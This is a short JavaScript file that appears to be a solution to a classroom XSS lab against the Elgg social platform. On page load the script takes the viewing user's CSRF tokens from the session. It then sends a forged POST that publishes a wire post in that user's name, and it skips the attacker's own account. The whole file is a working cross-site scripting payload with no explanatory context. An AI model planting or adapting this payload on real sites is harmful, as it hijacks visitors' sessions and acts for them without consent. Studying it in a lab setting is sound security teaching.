window.onload = function () {
    // var name = elgg.session.user.name;
    // var guid = "&guid="+elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var body = "&body=Link to sammy's profile";
    
    var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
    var content = ts + token + body;
    
    var samyGuid = 47;

    if (elgg.session.user.guid != samyGuid) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
